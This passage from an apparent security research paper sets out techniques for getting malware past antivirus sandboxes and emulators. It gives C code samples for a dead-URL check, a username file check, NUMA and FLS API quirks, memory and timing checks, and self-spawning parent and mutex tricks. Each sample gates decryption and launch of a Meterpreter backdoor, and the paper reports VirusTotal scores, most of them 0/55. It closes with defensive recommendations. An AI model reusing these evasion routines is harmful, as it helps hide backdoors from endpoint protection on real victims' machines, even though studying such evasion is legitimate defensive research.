char cononstart[] 
= "http://www.notdetectedmaliciouscode.com//"; //Invalid URL 
char readbuf[1024]; 
HINTERNET httpopen, openurl; 
DWORD read; 
httpopen=InternetOpen(NULL,INTERNET_OPEN_TYPE_DIRECT,NULL,NULL,0); 
openurl=InternetOpenUrl(httpopen,cononstart,NULL,NULL,INTERNET_FLAG_RELOAD|INTERNET
_FLAG_NO_CACHE_WRITE,NULL); 
if (!openurl) // Access failed, we are not in AV 
{ 
InternetCloseHandle(httpopen); 
InternetCloseHandle(openurl); 
decryptCodeSection(); 
startShellCode(); 
} 
else // Access successful, we are in AV and redirected to a custom webpage 
{ 
InternetCloseHandle(httpopen); 
InternetCloseHandle(openurl); 
} 
} 
VirusTotal score: 
2/55 
Something funny here. Among the two results I have one AV which thinks my stub may be a dropper 
(stupid heuristic false positives...). The second one really finds the Meterpreter backdoor. And this is 
really weird. That means either these guys have a really smart system or they allow AV connection in the 
sandbox they use. 
I remember reading about someone who actually got a remote Meterpreter connection when uploading 
to VirusTotal. Maybe it was the same scanner. 
13 
6.3. The “Knowing your enemy” method 
If one knows some information on the target machine, it becomes pretty easy to bypass any AV. Just link 
the code decryption mechanism to some information you know on the target PC (or group of PCs). 
Example 1: Action which depends on local username 
If the username of someone on system is known, it is possible to ask for actions depending on that 
username. For example, we can attempt to write and read inside the user account files. In the code 
below we create a file on a user desktop, we write some chars in it, then only we can open the file and 
read the chars, we start the decryption scheme.   
#define FILE_PATH "C:\\Users\\bob\\Desktop\\tmp.file" 
int main() 
{ 
HANDLE file; 
DWORD tmp; 
LPCVOID buff = "1234"; 
char outputbuff[5]={0}; 
file = CreateFile(FILE_PATH, GENERIC_WRITE, 0, NULL, CREATE_ALWAYS,    
FILE_ATTRIBUTE_NORMAL, 0); 
if(WriteFile(file, buff, strlen((const char *)buff), &tmp, NULL)) 
{ 
CloseHandle(file); 
file = CreateFile(FILE_PATH,      
                       GENERIC_READ,           
                       FILE_SHARE_READ,        
                       NULL,                   
                       OPEN_EXISTING,         // existing file only 
                       FILE_ATTRIBUTE_NORMAL ,  
                       NULL);     
if(ReadFile(file,outputbuff,4,&tmp,NULL)) 
{ 
if(strncmp(buff,outputbuff,4)==0) 
{ 
decryptCodeSection(); 
startShellCode(); 
} 
} 
CloseHandle(file); 
} 
DeleteFile(FILE_PATH); 
return 0; 
} 
14 
VirusTotal score: 
0/55 
Needless to say this one is FUD. In fact, AV scanner will generally fail to create and write into a file which 
is in path not foreseen. I was surprised at first because I expected AV to self adapt to the host PC, well it 
is not the case (I’ve tested this with several AV on the same PC, not only using VirusTotal). 
6.4. The “WTF is that?” method 
Windows system API is so big that AV emulation system just don’t cover everything. In this section I just 
put two examples but a lot other exist in the meander of Windows system APIs. 
Example 1: What the fuck is NUMA? 
NUMA stands for Non Uniform Memory Access. It is a method to configure memory management in 
multiprocessing systems. It is linked to a whole set of functions declare in Kernel32.dll 
More information is available at http://msdn.microsoft.com/en-
us/library/windows/desktop/aa363804%28v=vs.85%29.aspx 
The next code will work on a regular PC but will fail in AV emulators. 
int main( void ) 
{ 
        LPVOID mem = NULL; 
        mem = VirtualAllocExNuma(GetCurrentProcess(), NULL, 1000, MEM_RESERVE | 
MEM_COMMIT, PAGE_EXECUTE_READWRITE,0); 
        if (mem != NULL) 
        { 
                 decryptCodeSection(); 
     startShellCode(); 
        } 
        return 0; 
} 
VirusTotal score: 
0/55 
15 
Example 2: What the fuck are FLS? 
FLS is Fiber Local Storage, used to manipulate data related to fibers. Fibers themselves are unit of 
execution running inside threads. See more information in http://msdn.microsoft.com/en-
gb/library/windows/desktop/ms682661%28v=vs.85%29.aspx 
What is interesting here is that some AV emulators will always return FLS_OUT_OF_INDEXES for the 
FlsAlloc function.  
int main( void ) 
{ 
DWORD result =  FlsAlloc(NULL); 
            if (result != FLS_OUT_OF_INDEXES) 
{ 
decryptCodeSection(); 
startShellCode(); 
} 
return 0; 
} 
VirusTotal score: 
8/55 
16 
6.5. The “Checking the environment” method 
Here again the principle is simple. If the AV relies on a Sandboxed/emulated environment, some 
environment checks will necessarily be different from the real infection case. 
There are lots of ways to do these kinds of checks. Two of those are described in this section: 
Example 1: Check process memory 
Using sysinternal tools I realized that when an AV scans a process it affects its memory. The AV will 
allocate memory for that, also the emulated code process API will return different values from what is 
expected. In this case I use the GetProcessMemoryInfo on the current process. If this current working set 
is bigger than 3500000 bytes I consider the code is running in an AV environment, if it is not the case, the 
code is decrypted and started. 
#include  
#pragma comment(lib, "Psapi.lib") 
int main() 
{ 
PROCESS_MEMORY_COUNTERS pmc; 
            GetProcessMemoryInfo(GetCurrentProcess(), &pmc, sizeof(pmc)); 
if(pmc.WorkingSetSize 
#pragma comment (lib, "winmm.lib") 
int main() 
{ 
DWORD mesure1 ; 
DWORD mesure2 ; 
mesure1 = timeGetTime(); 
Sleep(1000); 
mesure2 = timeGetTime(); 
if((mesure2 > (mesure1+ 1000))&&(mesure2 0) 
    { 
18 
         decryptCodeSection(); 
         startShellCode(); 
    } 
    return 0; 
} 
VirusTotal score: 
0/55 
The DeepSec article was written in 2013 and method is still FUD. 
6.6. The “I call myself” method 
This is a variation of the environment check method. The AV will only trigger the code if it has been 
called in a certain way. 
Example 1: I am my own father 
In this example the executable (test.exe) will only enter the decryption branch if its parent process is also 
test.exe. When the code is launched, it will get its parent process ID and if this parent process is not 
test.exe, it will call test.exe and then stop. The called process will then have a parent called test.exe and 
will enter the decryption part. 
#include  
#include  
#pragma comment(lib, "Psapi.lib") 
int main() 
{ 
    int pid = -1; 
    HANDLE hProcess; 
    HANDLE h = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0); 
    PROCESSENTRY32 pe = { 0 }; 
    pe.dwSize = sizeof(PROCESSENTRY32); 
    // Get current PID 
    pid = GetCurrentProcessId(); 
    if( Process32First(h, &pe))  
    { 
// find parent PID 
do  
{ 
    if (pe.th32ProcessID == pid)  
    { 
  // Now we have the parent ID, check the module name 
19 
               // Get a handle to the process. 
        hProcess = OpenProcess( PROCESS_QUERY_INFORMATION | PROCESS_VM_READ, FALSE, 
pe.th32ParentProcessID); 
 // Get the process name. 
 if (NULL != hProcess ) 
 { 
     HMODULE hMod; 
     DWORD cbNeeded; 
     TCHAR processName[MAX_PATH]; 
    if ( EnumProcessModules( hProcess, &hMod, sizeof(hMod), &cbNeeded) ) 
    { 
        // If parent process is myself, decrypt the code 
GetModuleBaseName( hProcess, hMod, processName, 
sizeof(processName)/sizeof(TCHAR) ); 
if (strncmp(processName,"test.exe",strlen(processName))==0) 
{ 
decryptCodeSection(); 
startShellCode(); 
} 
else 
{ 
    // or else call my binary in a new process  
    startExe("test.exe"); 
    Sleep(100); // Wait for child 
} 
    } 
} 
// Release the handle to the process. 
CloseHandle( hProcess ); 
    } 
} while( Process32Next(h, &pe)); 
    } 
    CloseHandle(h);  
    return 0; 
} 
VirusTotal score: 
1/55 
AV are generally not able to follow this kind of process because they will scan the parent and not the 
child process (even if it is in fact the same code).  
20 
Example2: First open a mutex 
In this example, the code (test.exe) will only start decryption code if a certain mutex object already exists 
on the system. The trick is that if the object does not exist, this code will create and call a new instance 
of itself. The child process will try to create the mutex before the father process dies and will fall into the 
ERROR_ALREADY_EXIST code branch.  
int main() 
{ 
HANDLE mutex; 
mutex = CreateMutex(NULL, TRUE, "muuuu");  
            if (GetLastError() == ERROR_ALREADY_EXISTS) 
{ 
decryptCodeSection(); 
startShellCode(); 
} 
else 
{ 
startExe("test.exe"); 
                        Sleep(100); 
} 
return 0; 
} 
VirusTotal score: 
0/55 
Another very simple example which renders fully undetectable code. 
21 
7. Conclusion 
To conclude these examples show it is pretty simple to bypass AV when you exploit their weaknesses. It 
only requires some knowledge on windows System and how AV works. However, I do not say that having 
AV is useless. AV is very useful detecting those millions of wild bots which are already in its database. 
Also AV is useful for system recovery. What I am saying is that AV can be easily fooled by new viruses, 
especially in the case of a targeted attack. 
Customized malwares are often used as part of APT and AV might probably be useless against them. This 
doesn’t mean that everything is lost! There are alternatives solutions to AV, system hardening, 
application whitelisting, Host Intrusion Prevention Systems. These solutions having their own assets and 
weaknesses. 
If I may give some humble recommendations against malwares I would say: 
Never run as administrator if you don’t have to. This is a golden rule,  it can avoid 99% malwares 
without having an AV. This has been the normal way of doing things for Linux users for years. It is 
in my opinion the most important security measure. 
Harden the systems, recent versions of Windows have really strong security features, use them.  
Invest in Network Intrusion Detection Systems and monitor your network. Often, malware 
infections are not detected on the victims PC but thanks to weird NIDS or firewall logs. 
If you can afford it, use several AV products from different vendors. One product can cover the 
weakness of another, also there are possibilities that products coming from a country will be 
friendly to this country government malwares. 
If you can afford it use other kind of security products from different vendors. 
Last but not least, human training. Tools are nothing when the human can be exploited.